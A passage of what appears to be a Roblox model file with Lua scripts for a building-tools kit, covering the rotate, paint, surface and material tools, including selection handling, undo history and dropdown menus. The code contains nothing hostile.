				self:showHandles( Mouse.Target );
			end;

		end );

		-- Finally, attach the handles to the last item added to the selection (if any)
		if Selection.Last then
			self:showHandles( Selection.Last );
		end;

		-- Update the GUI's option panel
		if self.GUI then
			PivotOptionGUI.Center.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Center.Background.Image = Assets.LightSlantedRectangle;
			PivotOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Local.Background.Image = Assets.LightSlantedRectangle;
			PivotOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 0;
			PivotOptionGUI.Last.Background.Image = Assets.DarkSlantedRectangle;
		end;

	end;

end;


Tools.Rotate.showHandles = function ( self, Part )

	-- Create the handles if they don't exist yet
	if not self.Handles then

		-- Create the object
		self.Handles = RbxUtility.Create "ArcHandles" {
			Name = "BTRotationHandles";
			Color = self.Color;
			Parent = GUIContainer;
		};

		-- Add functionality to the handles

		self.Handles.MouseButton1Down:connect( function ()

			-- Prevent the platform from thinking we're selecting
			override_selection = true;
			self.State.rotating = true;

			-- Clear the change stats
			self.State.degrees_rotated = 0;
			self.State.rotation_size = 0;

			self:startHistoryRecord();

			-- Do a few things to the selection before manipulating it
			for _, Item in pairs( Selection.Items ) do

				-- Keep a copy of the state of each item
				self.State.PreRotation[Item] = Item:Clone();

				-- Anchor each item
				Item.Anchored = true;

			end;

			-- Also keep the position of the original selection
			local PreRotationSize, PreRotationPosition = _getCollectionInfo( self.State.PreRotation );
			self.State.PreRotationPosition = PreRotationPosition;

			-- Return stuff to normal once the mouse button is released
			self.Connections.HandleReleaseListener = Mouse.Button1Up:connect( function ()

				-- Prevent the platform from thinking we're selecting
				override_selection = true;
				self.State.rotating = false;

				-- Stop this connection from firing again
				if self.Connections.HandleReleaseListener then
					self.Connections.HandleReleaseListener:disconnect();
					self.Connections.HandleReleaseListener = nil;
				end;

				self:finishHistoryRecord();

				-- Restore properties that may have been changed temporarily
				-- from the pre-rotation state copies
				for Item, PreviousItemState in pairs( self.State.PreRotation ) do
					Item.Anchored = PreviousItemState.Anchored;
					self.State.PreRotation[Item] = nil;
					Item:MakeJoints();
				end;

			end );

		end );

		self.Handles.MouseDrag:connect( function ( axis, drag_distance )

			-- Round down and convert the drag distance to degrees to make it easier to work with
			local drag_distance = math.floor( math.deg( drag_distance ) );

			-- Calculate which multiple of the increment to use based on the current angle's
			-- proximity to their nearest upper and lower multiples

			local difference = drag_distance % self.Options.increment;

			local lower_degree = drag_distance - difference;
			local upper_degree = drag_distance - difference + self.Options.increment;

			local lower_degree_proximity = math.abs( drag_distance - lower_degree );
			local upper_degree_proximity = math.abs( drag_distance - upper_degree );

			if lower_degree_proximity <= upper_degree_proximity then
				drag_distance = lower_degree;
			else
				drag_distance = upper_degree;
			end;

			local increase = self.Options.increment * math.floor( drag_distance / self.Options.increment );

			self.State.degrees_rotated = drag_distance;

			-- Go through the selection and make changes to it
			for _, Item in pairs( Selection.Items ) do

				-- Keep a copy of `Item` in case we need to revert anything
				local PreviousItemState = Item:Clone();

				-- Break any of `Item`'s joints so it can move freely
				Item:BreakJoints();

				-- Rotate `Item` according to the options and the handle that was used
				if axis == Enum.Axis.Y then
					if self.Options.pivot == "center" then
						Item.CFrame = self.State.PreRotationPosition:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, math.rad( increase ), 0 ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.State.PreRotationPosition ):inverse() );
					elseif self.Options.pivot == "local" then
						Item.CFrame = self.State.PreRotation[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, math.rad( increase ), 0 ) );
					elseif self.Options.pivot == "last" then
						Item.CFrame = ( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, math.rad( increase ), 0 ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):inverse() );
					end;
				elseif axis == Enum.Axis.X then
					if self.Options.pivot == "center" then
						Item.CFrame = self.State.PreRotationPosition:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( math.rad( increase ), 0, 0 ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.State.PreRotationPosition ):inverse() );
					elseif self.Options.pivot == "local" then
						Item.CFrame = self.State.PreRotation[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( math.rad( increase ), 0, 0 ) );
					elseif self.Options.pivot == "last" then
						Item.CFrame = ( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( math.rad( increase ), 0, 0 ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):inverse() );
					end;
				elseif axis == Enum.Axis.Z then
					if self.Options.pivot == "center" then
						Item.CFrame = self.State.PreRotationPosition:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, 0, math.rad( increase ) ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.State.PreRotationPosition ):inverse() );
					elseif self.Options.pivot == "local" then
						Item.CFrame = self.State.PreRotation[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, 0, math.rad( increase ) ) );
					elseif self.Options.pivot == "last" then
						Item.CFrame = ( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):toWorldSpace( CFrame.new( 0, 0, 0 ) * CFrame.Angles( 0, 0, math.rad( increase ) ) ):toWorldSpace( self.State.PreRotation[Item].CFrame:toObjectSpace( self.Options.PivotPoint or self.State.PreRotation[Selection.Last].CFrame ):inverse() );
					end;
				end;

				-- Make joints with surrounding parts again once the resizing is done
				Item:MakeJoints();

			end;

		end );

	end;

	-- Stop listening for the existence of the previous adornee (if any)
	if self.Connections.AdorneeExistenceListener then
		self.Connections.AdorneeExistenceListener:disconnect();
		self.Connections.AdorneeExistenceListener = nil;
	end;

	-- Attach the handles to `Part`
	self.Handles.Adornee = Part;

	-- Make sure to hide the handles if `Part` suddenly stops existing
	self.Connections.AdorneeExistenceListener = Part.AncestryChanged:connect( function ( Object, NewParent )

		-- Make sure this change in parent applies directly to `Part`
		if Object ~= Part then
			return;
		end;

		-- Show the handles according to the existence of the part
		if NewParent == nil then
			self:hideHandles();
		else
			self:showHandles( Part );
		end;

	end );

end;

Tools.Rotate.hideHandles = function ( self )

	-- Hide the handles if they exist
	if self.Handles then
		self.Handles.Adornee = nil;
	end;

end;

Tools.Rotate.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX070DC472DD6846B29E42D707632A2B2B">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTPaintTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Paint tool
------------------------------------------

-- Create the main container for this tool
Tools.Paint = {};

-- Define the color of the tool
Tools.Paint.Color = BrickColor.new( "Really red" );

-- Define options
Tools.Paint.Options = {
	["Color"] = nil
};

Tools.Paint.State = {};

-- Add listeners
Tools.Paint.Listeners = {};

Tools.Paint.Listeners.Equipped = function ()

	local self = Tools.Paint;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Show the GUI
	self:showGUI();

	-- Update the selected color
	self:changeColor( self.Options.Color );

end;

Tools.Paint.Listeners.Unequipped = function ()

	local self = Tools.Paint;

	-- Clear out the preferred color option
	self:changeColor( nil );

	-- Hide the GUI
	self:hideGUI();

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Paint.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_colors = {};
		terminal_colors = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.BrickColor = self.initial_colors[Target];
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.BrickColor = self.terminal_colors[Target];
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_colors[Item] = Item.BrickColor;
		end;
	end;

end;

Tools.Paint.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_colors[Item] = Item.BrickColor;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Paint.Listeners.Button1Up = function ()

	local self = Tools.Paint;

	-- Make sure that they clicked on one of the items in their selection
	-- (and they weren't multi-selecting)
	if Selection:find( Mouse.Target ) and not selecting and not selecting then

		override_selection = true;

		self:startHistoryRecord();

		-- Paint all of the selected items `Tools.Paint.Options.Color`
		if self.Options.Color then
			for _, Item in pairs( Selection.Items ) do
				Item.BrickColor = self.Options.Color;
			end;
		end;

		self:finishHistoryRecord();

	end;

end;

Tools.Paint.changeColor = function ( self, Color )

	-- Alright so if `Color` is given, set that as the preferred color
	if Color then

		-- First of all, change the color option itself
		self.Options.Color = Color;

		self:startHistoryRecord();

		-- Then, we want to update the color of any items in the selection
		for _, Item in pairs( Selection.Items ) do
			Item.BrickColor = Color;
		end;

		self:finishHistoryRecord();

		-- After that, we want to mark our new color in the palette
		if self.GUI then

			-- First clear out any other marks
			for _, ColorSquare in pairs( self.GUI.Palette:GetChildren() ) do
				ColorSquare.Text = "";
			end;

			-- Then mark the right square
			self.GUI.Palette[Color.Name].Text = "X";

		end;

	-- Otherwise, let's assume no color at all
	else

		-- Set the preferred color to none
		self.Options.Color = nil;

		-- Clear out any color option marks on any of the squares
		if self.GUI then
			for _, ColorSquare in pairs( self.GUI.Palette:GetChildren() ) do
				ColorSquare.Text = "";
			end;
		end;

	end;

end;

Tools.Paint.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTPaintToolGUI:Clone();
		Container.Parent = UI;

		for _, ColorButton in pairs( Container.Palette:GetChildren() ) do
			ColorButton.MouseButton1Click:connect( function ()
				self:changeColor( BrickColor.new( ColorButton.Name ) );
			end );
		end;

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Paint.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Paint.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXB8BBE15C46924C6C8349E54C4D11B59C">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTSurfaceTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Surface tool
------------------------------------------

-- Create the tool
Tools.Surface = {};

-- Define the tool's color
Tools.Surface.Color = BrickColor.new( "Bright violet" );

-- Keep a container for temporary connections
Tools.Surface.Connections = {};

-- Keep a container for state data
Tools.Surface.State = {
	["type"] = nil;
};

-- Maintain a container for options
Tools.Surface.Options = {
	["side"] = Enum.NormalId.Front;
};

-- Keep a container for platform event connections
Tools.Surface.Listeners = {};

-- Start adding functionality to the tool
Tools.Surface.Listeners.Equipped = function ()

	local self = Tools.Surface;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Restore the side option
	self:changeSurface( self.Options.side );

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the surface type of every item in the selection
				local surface_type = nil;
				for item_index, Item in pairs( Selection.Items ) do

					-- Set the first values for the first item
					if item_index == 1 then
						surface_type = Item[self.Options.side.Name .. "Surface"];

					-- Otherwise, compare them and set them to `nil` if they're not identical
					else
						if surface_type ~= Item[self.Options.side.Name .. "Surface"] then
							surface_type = nil;
						end;
					end;

				end;

				self.State.type = surface_type;

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Surface.Listeners.Unequipped = function ()

	local self = Tools.Surface;

	-- Stop the GUI updating loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Surface.Listeners.Button2Down = function ()

	local self = Tools.Surface;

	-- Capture the camera rotation (for later use
	-- in determining whether a surface was being
	-- selected or the camera was being rotated
	-- with the right mouse button)
	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	self.State.PreB2DownCameraRotation = Vector3.new( cr_x, cr_y, cr_z );

end;

Tools.Surface.Listeners.Button2Up = function ()

	local self = Tools.Surface;

	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	local CameraRotation = Vector3.new( cr_x, cr_y, cr_z );

	-- If a surface is selected
	if Selection:find( Mouse.Target ) and self.State.PreB2DownCameraRotation == CameraRotation then
		self:changeSurface( Mouse.TargetSurface );
	end;

end;

Tools.Surface.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		target_surface = self.Options.side;
		initial_surfaces = {};
		terminal_surfaces = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target[self.target_surface.Name .. "Surface"] = self.initial_surfaces[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target[self.target_surface.Name .. "Surface"] = self.terminal_surfaces[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_surfaces[Item] = Item[self.Options.side.Name .. "Surface"];
		end;
	end;

end;

Tools.Surface.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_surfaces[Item] = Item[self.Options.side.Name .. "Surface"];
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Surface.SpecialTypeNames = {
	SmoothNoOutlines = "NO OUTLINE",
	Inlet = "INLETS"
};

Tools.Surface.changeType = function ( self, surface_type )

	self:startHistoryRecord();

	-- Apply `surface_type` to all items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item[self.Options.side.Name .. "Surface"] = surface_type;
		Item:MakeJoints();
	end;

	self:finishHistoryRecord();

	self.TypeDropdown:selectOption( self.SpecialTypeNames[surface_type.Name] or surface_type.Name:upper() );
	if self.TypeDropdown.open then
		self.TypeDropdown:toggle();
	end;
end;

Tools.Surface.changeSurface = function ( self, surface )
	self.Options.side = surface;
	self.SideDropdown:selectOption( surface.Name:upper() );
	if self.SideDropdown.open then
		self.SideDropdown:toggle();
	end;
end;

Tools.Surface.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	if #Selection.Items > 0 then
		self.TypeDropdown:selectOption( self.State.type and ( self.SpecialTypeNames[self.State.type.Name] or self.State.type.Name:upper() ) or "*" );
	else
		self.TypeDropdown:selectOption( "" );
	end;

end;

Tools.Surface.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTSurfaceToolGUI:Clone();
		Container.Parent = UI;

		local SideDropdown = createDropdown();
		self.SideDropdown = SideDropdown;
		SideDropdown.Frame.Parent = Container.SideOption;
		SideDropdown.Frame.Position = UDim2.new( 0, 30, 0, 0 );
		SideDropdown.Frame.Size = UDim2.new( 0, 72, 0, 25 );

		SideDropdown:addOption( "TOP" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Top );
		end );
		SideDropdown:addOption( "BOTTOM" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Bottom );
		end );
		SideDropdown:addOption( "FRONT" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Front );
		end );
		SideDropdown:addOption( "BACK" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Back );
		end );
		SideDropdown:addOption( "LEFT" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Left );
		end );
		SideDropdown:addOption( "RIGHT" ).MouseButton1Up:connect( function ()
			self:changeSurface( Enum.NormalId.Right );
		end );

		local TypeDropdown = createDropdown();
		self.TypeDropdown = TypeDropdown;
		TypeDropdown.Frame.Parent = Container.TypeOption;
		TypeDropdown.Frame.Position = UDim2.new( 0, 30, 0, 0 );
		TypeDropdown.Frame.Size = UDim2.new( 0, 87, 0, 25 );

		TypeDropdown:addOption( "STUDS" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Studs );
		end );
		TypeDropdown:addOption( "INLETS" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Inlet );
		end );
		TypeDropdown:addOption( "SMOOTH" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Smooth );
		end );
		TypeDropdown:addOption( "WELD" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Weld );
		end );
		TypeDropdown:addOption( "GLUE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Glue );
		end );
		TypeDropdown:addOption( "UNIVERSAL" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Universal );
		end );
		TypeDropdown:addOption( "HINGE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Hinge );
		end );
		TypeDropdown:addOption( "MOTOR" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.Motor );
		end );
		TypeDropdown:addOption( "NO OUTLINE" ).MouseButton1Up:connect( function ()
			self:changeType( Enum.SurfaceType.SmoothNoOutlines );
		end );

		self.GUI = Container;

	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Surface.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Surface.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBXE8EC6AD73C834869B6FBD2512409046A">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTMaterialTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Material tool
------------------------------------------

-- Create the tool
Tools.Material = {};
Tools.Material.Color = BrickColor.new( "Bright violet" );
Tools.Material.Connections = {};
Tools.Material.State = {
	["material"] = nil;
	["reflectance_focused"] = false;
	["transparency_focused"] = false;
};
Tools.Material.Listeners = {};
Tools.Material.SpecialMaterialNames = {
	CorrodedMetal = "CORRODED METAL",
	DiamondPlate = "DIAMOND PLATE",
	SmoothPlastic = "SMOOTH PLASTIC",
	WoodPlanks = "WOOD PLANKS"
};

-- Start adding functionality to the tool
Tools.Material.Listeners.Equipped = function ()

	local self = Tools.Material;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the material type of every item in the selection
				local material_type, transparency, reflectance = nil, nil, nil;
				for item_index, Item in pairs( Selection.Items ) do

					-- Set the first values for the first item
					if item_index == 1 then
						material_type = Item.Material;
						transparency = Item.Transparency;
						reflectance = Item.Reflectance;

					-- Otherwise, compare them and set them to `nil` if they're not identical
					else
						if material_type ~= Item.Material then
							material_type = nil;
						end;
						if reflectance ~= Item.Reflectance then
							reflectance = nil;
						end;
						if transparency ~= Item.Transparency then
							transparency = nil;
						end;
					end;

				end;

				self.State.material = material_type;
				self.State.transparency = transparency;
				self.State.reflectance = reflectance;

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Material.Listeners.Unequipped = function ()

	local self = Tools.Material;

	-- Stop the GUI updating loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Material.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_material = {};
		terminal_material = {};
		initial_transparency = {};
		terminal_transparency = {};
		initial_reflectance = {};
		terminal_reflectance = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Material = self.initial_material[Target];
					Target.Transparency = self.initial_transparency[Target];
					Target.Reflectance = self.initial_reflectance[Target];
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Material = self.terminal_material[Target];
					Target.Transparency = self.terminal_transparency[Target];
					Target.Reflectance = self.terminal_reflectance[Target];
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_material[Item] = Item.Material;
			self.State.HistoryRecord.initial_transparency[Item] = Item.Transparency;
			self.State.HistoryRecord.initial_reflectance[Item] = Item.Reflectance;
		end;
	end;

end;

Tools.Material.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_material[Item] = Item.Material;
			self.State.HistoryRecord.terminal_transparency[Item] = Item.Transparency;
			self.State.HistoryRecord.terminal_reflectance[Item] = Item.Reflectance;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Material.changeMaterial = function ( self, material_type )

	self:startHistoryRecord();

	-- Apply `material_type` to all items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.Material = material_type;
	end;

	self:finishHistoryRecord();

	if self.MaterialDropdown.open then
		self.MaterialDropdown:toggle();
	end;
end;

Tools.Material.changeTransparency = function ( self, transparency )

	self:startHistoryRecord();

	-- Apply `transparency` to all items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.Transparency = transparency;
	end;

	self:finishHistoryRecord();

end;

Tools.Material.changeReflectance = function ( self, reflectance )

	self:startHistoryRecord();

	-- Apply `reflectance` to all items in the selection
	for _, Item in pairs( Selection.Items ) do
		Item.Reflectance = reflectance;
	end;

	self:finishHistoryRecord();

end;

Tools.Material.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	if #Selection.Items > 0 then
		self.GUI.Size = UDim2.new( 0, 200, 0, 145 );
		self.GUI.MaterialOption.Visible = true;
		self.GUI.ReflectanceOption.Visible = true;
		self.GUI.TransparencyOption.Visible = true;
		self.GUI.SelectNote.Visible = false;
		self.MaterialDropdown:selectOption( self.State.material and ( self.SpecialMaterialNames[self.State.material.Name] or self.State.material.Name:upper() ) or "*" );

		-- Update the text inputs without interrupting the user
		if not self.State.transparency_focused then
			self.GUI.TransparencyOption.TransparencyInput.TextBox.Text = self.State.transparency and tostring( _round( self.State.transparency, 2 ) ) or "*";
		end;
		if not self.State.reflectance_focused then
			self.GUI.ReflectanceOption.ReflectanceInput.TextBox.Text = self.State.reflectance and tostring( _round( self.State.reflectance, 2 ) ) or "*";
		end;

	else
		self.GUI.Size = UDim2.new( 0, 200, 0, 62 );
		self.GUI.MaterialOption.Visible = false;
		self.GUI.ReflectanceOption.Visible = false;
		self.GUI.TransparencyOption.Visible = false;
		self.GUI.SelectNote.Visible = true;
		self.MaterialDropdown:selectOption( "" );
		self.GUI.TransparencyOption.TransparencyInput.TextBox.Text = "";
		self.GUI.ReflectanceOption.ReflectanceInput.TextBox.Text = "";
	end;

end;


Tools.Material.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTMaterialToolGUI:Clone();
		Container.Parent = UI;

		local MaterialDropdown = createDropdown();
		self.MaterialDropdown = MaterialDropdown;
		MaterialDropdown.Frame.Parent = Container.MaterialOption;
		MaterialDropdown.Frame.Position = UDim2.new( 0, 50, 0, 0 );
		MaterialDropdown.Frame.Size = UDim2.new( 0, 130, 0, 25 );

		MaterialDropdown:addOption( "SMOOTH PLASTIC" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.SmoothPlastic );
		end );
		MaterialDropdown:addOption( "PLASTIC" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Plastic );
		end );
		MaterialDropdown:addOption( "CONCRETE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Concrete );
		end );
		MaterialDropdown:addOption( "DIAMOND PLATE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.DiamondPlate );
		end );
		MaterialDropdown:addOption( "CORRODED METAL" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.CorrodedMetal );
		end );
		MaterialDropdown:addOption( "BRICK" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Brick );
		end );
		MaterialDropdown:addOption( "FABRIC" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Fabric );
		end );
		MaterialDropdown:addOption( "FOIL" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Foil );
		end );
		MaterialDropdown:addOption( "GRANITE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Granite );
		end );
		MaterialDropdown:addOption( "GRASS" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Grass );
		end );
		MaterialDropdown:addOption( "ICE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Ice );
		end );
		MaterialDropdown:addOption( "MARBLE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Marble );
		end );
		MaterialDropdown:addOption( "PEBBLE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Pebble );
		end );
		MaterialDropdown:addOption( "SAND" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Sand );
		end );
		MaterialDropdown:addOption( "SLATE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Slate );
		end );
		MaterialDropdown:addOption( "WOOD" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Wood );
		end );
		MaterialDropdown:addOption( "WOOD PLANKS" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.WoodPlanks );
		end );
		MaterialDropdown:addOption( "COBBLESTONE" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Cobblestone );
		end );
		MaterialDropdown:addOption( "METAL" ).MouseButton1Up:connect( function ()
			self:changeMaterial( Enum.Material.Metal );
		end );

		-- Capture focus of the input when clicked
		-- (so we can detect when it is focused-on)
		Container.TransparencyOption.TransparencyInput.TextButton.MouseButton1Down:connect( function ()
			self.State.transparency_focused = true;
			Container.TransparencyOption.TransparencyInput.TextBox:CaptureFocus();
		end );

		-- Change the transparency when the value of the textbox is updated
